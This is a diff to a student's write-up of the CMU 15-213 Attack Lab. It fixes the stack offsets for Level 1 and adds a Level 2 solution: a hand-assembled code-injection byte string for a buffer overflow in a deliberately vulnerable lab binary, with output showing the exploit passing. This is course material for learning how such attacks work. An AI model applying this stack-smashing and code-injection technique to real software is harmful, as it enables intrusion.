@@ -73,8 +73,7 @@ Here is the stack organization at the point after *call*:
 
 | address     | data        |
 |------------ | ----------- |
-| %rsp + 0x38 | 0x401971    |
-| %rsp + 0x30 |             |
+| %rsp + 0x30 | 0x401976    |
 | %rsp + 0x28 |             |
 | %rsp + 0x20 |             |
 | %rsp + 0x18 |             |
@@ -82,9 +81,9 @@ Here is the stack organization at the point after *call*:
 | %rsp + 0x08 |             |
 | %rsp        | 0x4017b4    |
 
-Where *%rdi* point to *%rsp + 0x8*, *%rsp* contains the address to the instruction after the call to *Gets* in *getbuf*, and *rsp + 0x38* contains the address to the instructino after the call to *getbuf* in *test*.
+Where *%rdi* point to *%rsp + 0x8*, *%rsp* contains the address to the instruction after the call to *Gets* in *getbuf*, and *rsp + 0x30* contains the address to the instructino after the call to *getbuf* in *test*.
 
-Our goal is to replace *%rsp + 0x38* with the address of the *touch1* function (0x4017c0).
+Our goal is to replace *%rsp + 0x30* with the address of the *touch1* function (0x4017c0).
 
 To do that, we can simply write 40 arbitrary characters, and then 4 bytes corresponding to the *touch1* address. See [exploit_ctarget_1.txt](exploit_ctarget_1.txt) for the solution to this problem.
 
@@ -104,3 +103,36 @@ PASS: Would have posted the following:
 ```
 
 ## Level 2
+
+The idea is to write a function inside the buffer, say at *%rsp + 0x08* and pass control to that function from *getbuf*. Inside that function, we write our cookie to *%rdi*, and then pass control again to the *touch2* function.
+
+To implement two function returns that first returns to *%rsp + 0x08* and then to *touch2*, at first I thought we should put *%rsp + 0x08* to *%rsp + 0x30* (the return address of *getbuf*), and put *touch2* address above it (*%rsp + 0x38*). However, I got a segmentation fault. This is most probably due to messing with *test* function's stack.
+
+A better way would be to push the address of *touch2* before calling *ret* from our injected code.
+
+Note that *%rsp + 0x08* is the stack pointer after allocating `buf` in `getbuf`. We can get this value with GDB.
+
+Here is the assembly code we need to inject to our string:
+
+```Assembly
+bf fa 97 b9 59                                              /* %rsp + 0x08: mov 0x59b997fa %edi */
+68 ec 17 40 00                                              /* %rsp + 0x0d: push ox4017ec */ 
+c3                                                          /* %rsp + 0x12: ret */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 /* %rsp + 0x13: arbitrary bytes */
+00 00 00 00 00 00 00 00 00                                  /* %rsp + 0x27: arbitrary bytes */
+78 dc 61 55 00 00 00 00                                     /* %rsp + 0x30: %rsp + 0x08 */
+```
+
+Here is the output after running ctarget with the exploit string:
+```
+❯ ./ctarget -q < solution/exploit_ctarget_2_raw.txt
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00
+ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
+ ```
